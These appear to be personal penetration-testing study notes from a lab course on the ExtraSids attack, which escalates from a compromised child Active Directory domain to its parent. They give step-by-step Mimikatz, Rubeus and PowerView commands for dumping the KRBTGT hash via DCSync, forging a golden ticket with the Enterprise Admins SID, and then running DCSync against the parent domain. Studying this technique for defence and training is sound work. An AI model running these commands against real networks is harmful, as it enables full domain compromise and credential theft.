# ExtraSids Attack
## Mimikatz
allows the compromise of a parent domain once a child domain has been compromised
- if a user in the child domain has their sidHistory set to the “Enterprise Admins” group (which only exists in parent domain), they are treated as a member of the group
  
to perform this attack, we need the following
- KRBTGT hash for the child domain
- SID for the child domain
- name of a target user in the child domain (does not need to exist)
    
    - for the example, they use “hacker”
    
- FQDN of the child domain
    
    - in our example, it is LOGISTICS.INLANEFREIGHT.LOCAL
    
- SID of the Enterprise Admins group of the root domain
- mimikatz to perform this attack with all above information
  
  
### Obtaining KRBTGT Account’s NT Hash Using Mimikatz
```JavaScript
lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt
```
![[/image 359.png|image 359.png]]
  
### Getting Domain SID
With PowerView
```JavaScript
Get-DomainSID
```
![[/image 1 267.png|image 1 267.png]]
  
### Obtaining Enterprise Admins Group’s SID using Get-DomainGroup
With PowerView
```JavaScript
Get-DomainGroup -Domain <DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
![[/image 2 226.png|image 2 226.png]]
  
### Creating a Golden Ticket with Mimikatz
now we have all the information we need
- KRBTGT hash for child domain
- SID for child domain
- name of target user (does not need to exist)
- FQDN of child domain
- SID for Enterprise Admins group
  
Use mimikatz to create a golden ticket
```JavaScript
kerberos::golden /user:<user> /domain:<CHILD_DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_hash> /sids:<enterprise_admins_sid> /ptt
```
![[/image 3 196.png|image 3 196.png]]
  
confirm that the golden ticket is in memory using “klist”
![[/image 4 172.png|image 4 172.png]]
  
can now list C: drive on parent domain controller
```JavaScript
ls \\<machine_name>.<DOMAIN>\c$
```
  
## Rubeus
to perform this attack we need the same information to perform the mimikatz attack (follow the exact same steps)
- KRBTGT hash for child domain
- SID for child domain
- name of target user (does not need to exist)
- FQDN of child domain
- SID for Enterprise Admins group
  
Once you have all the info, use Rubeus to create the golden ticket
```JavaScript
.\Rubeus.exe golden /rc4:<KRBTGT_hash> /domain:<CHILD_DOMAIN> /sid:<domain_sid>  /sids:<enterprise_admin_sid> /user:<user> /ptt
```
![[/image 5 161.png|image 5 161.png]]
- also gives you the base64 ticket
  
confirm it is cached in memory using “klist”
![[/image 6 140.png|image 6 140.png]]
  
### Perform DCSync Attack Against Parent Domain
```JavaScript
./mimikatz
lsadump::dcsync /user:<DOMAIN>\<user>
```
- they target just a single user, but you can also just dump the whole domain
- for domain, they just put “INLANEFREIGHT”, not “INLANEFREIGHT.LOCAL”
![[/image 7 131.png|image 7 131.png]]
  
when dealing with multiple domains and our target domain is not the one our user is from, we also have to specify the domain for DCSync
- example
```JavaScript
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```
![[/image 8 115.png|image 8 115.png]]